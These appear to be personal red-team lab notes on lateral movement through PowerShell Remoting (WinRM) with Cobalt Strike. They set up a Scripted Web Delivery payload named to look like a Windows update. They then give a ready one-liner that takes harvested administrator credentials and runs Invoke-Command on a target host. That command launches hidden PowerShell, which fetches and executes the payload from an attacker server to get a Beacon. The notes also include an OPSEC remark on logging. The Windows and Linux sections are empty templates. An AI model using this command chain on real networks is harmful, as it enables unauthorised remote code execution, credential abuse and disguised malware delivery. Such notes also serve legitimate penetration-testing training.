
### Technique Overview
PowerShell Remoting uses Windows Remote Management (WinRM) to allow users to run PowerShell commands on remote computers.
- Window remoting is another popular remote administration method.

Advantage > 1 Attacker to Many Hosts = WinRM
- The benefit of Windows Remoting over RDP is that it allows to make changes at scale, instead of having to do everything manually one by one. It should come as no surprise that it is also a popular lateral movement technique for adversaries!
###### OPSEC
Keep in mind that we are using PowerShell for lateral movement in this case, and that PowerShell commands are prone to extensive security measures such as AMSI and script-block logging.
# C2 - Cobalt Strike
```
## Enumeration 

```markdown
```

## Exploitation
First host a Scripted Web Delivery by Navigating to Attacks -> Scripted Web Delivery (S) in the top half of your Cobalt Strike Client.
- Fill in the familiar `/WindowsUpate` payload  

![[Pasted image 20240411234042.png]]

Let's construct our PowerShell OneLiner. We will create alternate credentials and pass those along with our Invoke-Command to execute our payload on FS01 
- Note: We got Administrator creds stored in `troubleshooting.ps1` PS file. These were found stored in the 'Sales' share accessible to the low privilege user we compromised.

```powershell
powershell $pspassword=ConvertTo-SecureString "sup3rs3cr3tP@ssw0rd!!" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential("FS01\Administrator",$pspassword);Invoke-Command -ComputerName fs01 -Credential $cred -ScriptBlock {powershell.exe -nop -w hidden -c "IEX(irm -useb 'http://10.130.4.100:8888/WindowsUpdate')"}
```

After successfull completion of the command, a new Beacon will check-in with high integrity.

![[Pasted image 20240411234257.png]]

---
# Windows
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```

----
# Linux
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```
